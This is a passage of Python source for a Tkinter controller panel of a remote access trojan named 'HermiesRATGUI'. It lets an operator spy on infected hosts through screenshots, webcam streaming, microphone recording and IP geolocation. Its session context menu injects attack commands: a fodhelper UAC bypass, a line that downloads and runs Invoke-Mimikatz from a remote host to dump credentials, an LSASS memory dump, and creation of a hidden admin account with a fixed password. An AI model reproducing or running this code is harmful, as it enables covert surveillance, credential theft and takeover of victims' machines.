                 highlightbackground=C["border"],
                 highlightthickness=1).pack(side=tk.LEFT, padx=(0,6))
        tk.Button(note_r, text="save", bg=C["bg3"], fg=C["txt"],
                  font=FONT, relief="flat", padx=8,
                  command=self._settings_save_note).pack(side=tk.LEFT)

    # 
    #  LOGS TAB
    # 

    def _build_logs_tab(self):
        f = self._make_frame("Logs")
        hdr = tk.Frame(f, bg=C["bg1"], height=24)
        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
        tk.Label(hdr, text="System Log",
                 bg=C["bg1"], fg=C["txt2"], font=FONT_SML
                 ).pack(side=tk.LEFT, padx=10, pady=4)
        tk.Button(hdr, text="clear", bg=C["bg1"], fg=C["txt3"],
                  font=FONT_SML, relief="flat", bd=0,
                  command=lambda: self._clear_text(self._log_widget)
                  ).pack(side=tk.RIGHT, padx=8)
        tk.Frame(f, bg=C["border"], height=1).pack(fill=tk.X)
        self._log_widget = scrolledtext.ScrolledText(
            f, bg=C["bg"], fg=C["txt"], font=FONT_MON,
            state="disabled", wrap=tk.WORD,
            relief="flat", borderwidth=0)
        self._log_widget.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)

    # 
    #  SCREENSHOT + WEBCAM POPUPS
    # 

    def _screenshot_popup(self):
        if self.selected_cid is None:
            self._term_print("  no session\n", C["red"]); return
        self._term_print("  grabbing screenshot...\n", C["txt2"])
        threading.Thread(
            target=self._ss_worker,
            args=(clients[self.selected_cid]["sock"],),
            daemon=True).start()

    def _ss_worker(self, sock):
        try:
            send_msg(sock,"screenshot",None)
            resp = recv_msg(sock)
            if not resp:
                self._term_print("  screenshot: no response\n",C["red"]); return
            envelope = resp.get("data")
            if isinstance(envelope, dict):
                b64    = envelope.get("data")
                method = envelope.get("method","?")
                if not b64:
                    self._term_print("  screenshot: all methods failed\n",C["red"])
                    return
            elif isinstance(envelope, str):
                b64, method = envelope, "legacy"
            else:
                self._term_print("  screenshot: bad envelope\n",C["red"]); return
            if not _PIL_OK:
                self._term_print("  PIL not installed\n",C["red"]); return
            img = Image.open(io.BytesIO(base64.b64decode(b64)))
            self._ss_pil = img
            self.after(0, lambda: ScreenshotWindow(self, img))
            self._term_print(
                f"  screenshot ok  [{method}]  {img.width}x{img.height}\n",
                C["accent"])
        except Exception as e:
            self._term_print(f"  screenshot error: {e}\n",C["red"])

    def _cam_start(self):
        if self.selected_cid is None:
            self._term_print("  no session\n",C["red"]); return
        if self._cam_streaming:
            self._term_print("  already streaming\n",C["txt2"]); return
        if not _PIL_OK:
            self._term_print("  PIL not installed\n",C["red"]); return
        self._cam_win = CameraWindow(self, self)
        self._cam_streaming = True
        self._term_print("  webcam stream started\n",C["accent"])
        threading.Thread(
            target=self._cam_stream_worker,
            args=(clients[self.selected_cid]["sock"],0,0.1),
            daemon=True).start()

    def _cam_stop(self):
        if not self._cam_streaming: return
        self._cam_streaming = False
        try:
            if self.selected_cid is not None:
                send_msg(clients[self.selected_cid]["sock"],
                         "camera_stream_stop",None)
        except: pass
        if self._cam_win:
            self._cam_win._close()
        self._term_print("  webcam stopped\n",C["txt2"])

    def _cam_stream_worker(self, sock, idx, interval):
        import select as _sel
        try:
            send_msg(sock,"camera_stream",{"index":idx,"interval":interval})
            while True:
                r,_,_ = _sel.select([sock],[],[],0.5)
                if not r:
                    if not self._cam_streaming: break
                    continue
                resp = recv_msg(sock)
                if resp is None or resp.get("cmd")=="camera_stream_ended": break
                if not self._cam_streaming: break
                b64 = resp.get("data")
                if b64 and _PIL_OK and self._cam_win:
                    try:
                        img = Image.open(io.BytesIO(base64.b64decode(b64)))
                        self._cam_win.push_frame(img)
                    except: pass
        except Exception as e:
            if self._cam_streaming:
                self._term_print(f"  cam error: {e}\n",C["red"])
        finally:
            self._cam_streaming = False

    # 
    #  MIC
    # 

    def _mic_record(self, duration=5.0):
        if self.selected_cid is None:
            self._term_print("  no session\n",C["red"]); return
        self._term_print(f"  recording {duration}s...\n",C["txt2"])
        threading.Thread(
            target=self._mic_record_worker,
            args=(clients[self.selected_cid]["sock"], duration),
            daemon=True).start()

    def _mic_record_worker(self, sock, duration):
        try:
            send_msg(sock,"mic_record",{"duration":duration})
            resp  = recv_msg(sock)
            inner = (resp or {}).get("data") or {}
            if not isinstance(inner,dict): inner={}
            if not inner.get("ok") or not inner.get("data"):
                err = inner.get("error","<no data>")
                self._term_print(f"  mic error: {err}\n",C["red"]); return
            raw    = base64.b64decode(inner["data"])
            method = inner.get("method","?")
            self._mic_wav_data = raw
            kb = len(raw)/1024
            self._term_print(
                f"  mic done  method={method}  {kb:.1f} KB\n",C["accent"])
        except Exception as e:
            self._term_print(f"  mic error: {e}\n",C["red"])

    def _mic_stop_stream(self):
        if not self._mic_streaming or self.selected_cid is None: return
        try:
            send_msg(clients[self.selected_cid]["sock"],"mic_stream_stop",None)
        except: pass
        self._mic_streaming = False
        self._term_print("  mic stream stopped\n",C["txt2"])

    def _mic_save(self):
        if not self._mic_wav_data:
            self._term_print("  nothing to save\n",C["txt2"]); return
        path = filedialog.asksaveasfilename(
            defaultextension=".wav",
            filetypes=[("WAV","*.wav"),("All","*.*")])
        if not path: return
        with open(path,"wb") as fh: fh.write(self._mic_wav_data)
        self._term_print(
            f"  saved {len(self._mic_wav_data)//1024} KB → {path}\n",C["accent"])

    # 
    #  MAP
    # 

    def _map_lookup_ip(self, ip):
        if ip in _map_geo_cache: return _map_geo_cache[ip]
        try:
            import urllib.request
            with urllib.request.urlopen(
                    f"https://ipinfo.io/{ip}/json",timeout=5) as r:
                data = json.loads(r.read().decode())
            loc  = data.get("loc","0,0").split(",")
            lat, lon = float(loc[0]), float(loc[1])
            result = {"ip":ip,"city":data.get("city",""),
                      "country":data.get("country",""),
                      "org":data.get("org",""),
                      "lat":lat,"lon":lon,"raw":data}
            _map_geo_cache[ip] = result; return result
        except Exception as e:
            return {"ip":ip,"city":"","country":"","org":"",
                    "lat":0.0,"lon":0.0,"error":str(e)}

    def _map_geo_all(self):
        with _lock:
            ips = list({v["label"].split(":")[0] for v in clients.values()})
        if not ips:
            self._term_print("  no clients\n",C["txt2"]); return
        self._term_print(f"  geolocating {len(ips)} client(s)...\n",C["txt2"])
        threading.Thread(target=self._map_lookup_worker,
                         args=(ips,), daemon=True).start()

    def _map_lookup_worker(self, ips):
        for ip in ips:
            if not ip or ip in ("127.0.0.1","0.0.0.0"): continue
            geo = self._map_lookup_ip(ip)
            self._term_print(
                f"  {geo['ip']}  {geo['city']} {geo['country']}  "
                f"{geo['lat']:.2f},{geo['lon']:.2f}\n")

    # 
    #  CONTEXT MENU  (right-click on session)
    # 

    def _show_ctx_menu(self, event, cid):
        self.selected_cid = cid
        self._refresh_sessions()
        mk = dict(bg=C["bg2"], fg=C["txt"],
                  activebackground=C["bg4"],
                  activeforeground=C["accent"],
                  font=FONT, relief="flat", bd=0, tearoff=0)
        menu  = tk.Menu(self, **mk)
        info  = clients.get(cid,{})
        label = info.get("label",f"client {cid}")
        menu.add_command(label=f"  ◉  {cid:08x}  {label}",
                         state="disabled",
                         font=("Consolas",9,"bold"))
        menu.add_separator()
        menu.add_command(label="  screenshot",
                         command=self._screenshot_popup)
        menu.add_command(label="  webcam start",
                         command=self._cam_start)
        menu.add_command(label="  webcam stop",
                         command=self._cam_stop)
        menu.add_separator()
        menu.add_command(label="  whoami",
            command=lambda: self._term_inject("auto",
                "whoami /all 2>&1 || id && uname -a"))
        menu.add_command(label="  sysinfo",
            command=lambda: self._term_inject("powershell",
                "Get-ComputerInfo | Select CsName,OsName,OsVersion"))
        menu.add_command(label="  clipboard",
            command=lambda: self._term_inject("powershell","Get-Clipboard"))
        menu.add_separator()

        priv = tk.Menu(menu, **mk)
        menu.add_cascade(label="  privesc  ▶", menu=priv)
        priv.add_command(label="  UAC fodhelper",
            command=lambda: self._term_inject("powershell",
                "New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command "
                "-Value 'cmd.exe /c start cmd.exe' -Force; "
                "New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command "
                "-Name DelegateExecute -Value '' -Force; "
                "Start-Process fodhelper.exe -WindowStyle Hidden"))
        priv.add_command(label="  mimikatz",
            command=lambda: self._term_inject("powershell",
                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/"
                "BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/"
                "Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"))
        priv.add_command(label="  dump LSASS",
            command=lambda: self._term_inject("powershell",
                "$p=(Get-Process lsass).Id; rundll32 C:\\Windows\\System32\\comsvcs.dll,"
                "MiniDump $p C:\\Windows\\Temp\\lsass.dmp full"))
        priv.add_command(label="  add admin user",
            command=lambda: self._term_inject("cmd",
                "net user hermies H3rm!esR@T /add & "
                "net localgroup administrators hermies /add"))

        troll = tk.Menu(menu, **mk)
        menu.add_cascade(label="  troll  ▶", menu=troll)
        for category, payloads in TROLL_PAYLOADS.items():
            cat_menu = tk.Menu(troll, **mk)
            troll.add_cascade(label=f"  {category}  ▶", menu=cat_menu)
            for lbl, shell, cmd in payloads:
                cat_menu.add_command(
                    label=f"  {lbl}",
                    command=lambda s=shell,c=cmd: self._term_inject(s,c))

        menu.add_separator()
        menu.add_command(label="  files  →",
                         command=lambda: self._switch_tab("Files"))
        menu.add_separator()
        menu.add_command(label="  disconnect",
                         command=self._disconnect,
                         foreground=C["red"],
                         activeforeground=C["red"])
        try:
            menu.tk_popup(event.x_root, event.y_root)
        finally:
            menu.grab_release()

    # 
    #  SHARED HELPERS
    # 

    def _disconnect(self):
        if self.selected_cid is None: return
        try:
            send_msg(clients[self.selected_cid]["sock"],"exit",None)
            clients[self.selected_cid]["sock"].close()
        except: pass
        with _lock:
            if self.selected_cid in clients:
                del clients[self.selected_cid]
        self.selected_cid = None
        self.refresh_clients()
        self.log("disconnected")

    def _dl_record(self, cid, tx, rx, event_line=""):
        self._traffic_totals["tx"] += tx
        self._traffic_totals["rx"] += rx
        if cid not in self._traffic_per_cid:
            self._traffic_per_cid[cid] = {"tx":0,"rx":0}
        self._traffic_per_cid[cid]["tx"] += tx
        self._traffic_per_cid[cid]["rx"] += rx

    def _restart_listener(self, port):
        if self._srv_sock:
            try: self._srv_sock.close()
            except: pass
            self._srv_sock = None
        last_err = None
        for attempt in range(4):
            if attempt: time.sleep(0.4*attempt)
            try:
                srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                if hasattr(socket,"SO_REUSEPORT"):
                    try: srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT,1)
                    except OSError: pass
                srv.bind(("0.0.0.0", port)); srv.listen(16)
                self._srv_sock = srv
                threading.Thread(target=accept_loop, args=(srv, self),
                          daemon=True).start()
                try:
                    self._status_lbl.configure(text="● listening", fg=C["accent"])
                    self._listen_lbl.configure(text=f"0.0.0.0:{port}")
                except Exception:
                    pass
                return True
            except OSError as e:
                last_err = e
                try: srv.close()
                except: pass
        self._status_lbl.configure(text="● error", fg=C["red"])
        self.log(f"listener error (:{port}): {last_err}")
        return False

    def log(self, msg):
        self._append(self._log_widget,
                     f"[{time.strftime('%H:%M:%S')}] {msg}\n")

    def _append(self, widget, text):
        def _do():
            widget.configure(state="normal")
            widget.insert(tk.END, text)
            widget.see(tk.END)
            widget.configure(state="disabled")
        self.after(0, _do)

    def _clear_text(self, widget):
        widget.configure(state="normal")
        widget.delete("1.0", tk.END)
        widget.configure(state="disabled")

    #  settings helpers ─

    def _settings_gen_secret(self):
        new = base64.b64encode(secrets.token_bytes(32)).decode()
        self._set_secret_var.set(new)
        self._set_secret_status.configure(text="generated",fg=C["txt2"])

    def _settings_save_secret(self):
        val = self._set_secret_var.get().strip()
        try: base64.b64decode(val)
        except:
            self._set_secret_status.configure(text="invalid base64",fg=C["red"]); return
        config._config["hmac_secret"] = val; config.save_config()
        self._set_secret_status.configure(text="saved",fg=C["accent"])

    def _settings_sync_secret(self):
        val = self._set_secret_var.get().strip()
        try: base64.b64decode(val)
        except:
            self._set_secret_status.configure(text="invalid base64",fg=C["red"]); return
        config.set_active_secret(val.encode())
        config._config["hmac_secret"] = val; config.save_config()
        try:    port = int(self._listen_lbl.cget("text").split(":")[1])
        except: port = PORT
        ok = self._restart_listener(port)
        self._set_secret_status.configure(
            text="synced" if ok else "secret set — listener failed",
            fg=C["accent"] if ok else C["red"])

    def _settings_browse_db(self):
        p = filedialog.asksaveasfilename(
            defaultextension=".db",
            filetypes=[("SQLite DB","*.db"),("All","*.*")])
        if p: self._set_db_path_var.set(p)

    def _settings_init_db(self):
        path = self._set_db_path_var.get().strip()
        if not path: return
        ok = database.db_init(path)
        if ok:
            self._set_db_status.configure(
                text=f"connected: {path}",fg=C["accent"])
            self.log(f"[db] connected: {path}")
            self._settings_refresh_db()
        else:
            self._set_db_status.configure(text="init failed",fg=C["red"])

    def _settings_disconnect_db(self):
        database.db_close()
        self._set_db_status.configure(text="disconnected",fg=C["txt3"])
        for row in self._set_db_tree.get_children():
            self._set_db_tree.delete(row)

    def _settings_refresh_db(self):
        if not hasattr(self,"_set_db_tree"): return
        for row in self._set_db_tree.get_children():
            self._set_db_tree.delete(row)
        rows = database.db_fetch_all()
        for r in rows: self._set_db_tree.insert("",tk.END,values=r)
        if database.db_connected():
            self._set_db_status.configure(
                text=f"connected: {self._set_db_path_var.get()}  "
                     f"({len(rows)} records)",fg=C["accent"])

    def _settings_delete_selected(self):
        sel = self._set_db_tree.selection()
        if not sel: return
        vals = self._set_db_tree.item(sel[0],"values")
        if not vals: return
        if messagebox.askyesno("delete",f"Remove {vals[0]}?"):
            database.db_delete(vals[0])
            self._settings_refresh_db()

    def _settings_save_note(self):
        sel = self._set_db_tree.selection()
        if not sel: return
        vals = self._set_db_tree.item(sel[0],"values")
        if not vals: return
        database.db_update_note(vals[0], self._set_note_var.get().strip())
        self._settings_refresh_db()


if __name__ == "__main__":
    app = HermiesRATGUI()
    app.mainloop()
